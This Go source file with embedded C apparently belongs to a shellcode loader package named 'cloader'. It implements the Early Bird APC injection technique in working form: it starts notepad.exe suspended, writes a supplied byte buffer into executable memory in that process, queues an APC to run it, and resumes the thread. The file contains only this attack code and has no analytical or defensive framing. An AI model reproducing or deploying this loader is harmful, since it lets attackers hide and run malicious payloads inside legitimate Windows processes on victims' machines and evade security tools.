package cloader

/*
#include <windows.h>

void earlyBirdAPC(uintptr_t p, int len) {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    // 初始化 STARTUPINFO 结构体
    si.cb = sizeof(STARTUPINFOA);

    // 创建进程并挂起
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe",
                        NULL,
                        NULL,
                        NULL,
                        FALSE,
                        CREATE_SUSPENDED,
                        NULL,
                        NULL,
                        &si,
                        &pi)) {
        return;
    }

    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;

    // 分配内存空间
    LPVOID shellAddress = VirtualAllocEx(victimProcess,
                                         NULL,
                                         len,
                                         MEM_COMMIT,
                                         PAGE_EXECUTE_READWRITE);

    if (shellAddress == NULL) {
        CloseHandle(victimProcess);
        CloseHandle(threadHandle);
        return;
    }

    // 将数据写入目标进程
    if (!WriteProcessMemory(victimProcess,
                            shellAddress,
                            (LPCVOID)p,
                            len,
                            NULL)) {
        VirtualFreeEx(victimProcess, shellAddress, 0, MEM_RELEASE);
        CloseHandle(victimProcess);
        CloseHandle(threadHandle);
        return;
    }

    // 排队 APC 以执行代码
    if (QueueUserAPC((PAPCFUNC)shellAddress, threadHandle, 0) == 0) {
        VirtualFreeEx(victimProcess, shellAddress, 0, MEM_RELEASE);
        CloseHandle(victimProcess);
        CloseHandle(threadHandle);
        return;
    }

    // 恢复线程执行
    if (ResumeThread(threadHandle) == (DWORD)-1) {
        VirtualFreeEx(victimProcess, shellAddress, 0, MEM_RELEASE);
        CloseHandle(victimProcess);
        CloseHandle(threadHandle);
        return;
    }

    // 关闭句柄
    CloseHandle(victimProcess);
    CloseHandle(threadHandle);
}

*/
import "C"
import "unsafe"

func EarlyBirdAPC(p []byte) {
	C.earlyBirdAPC((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
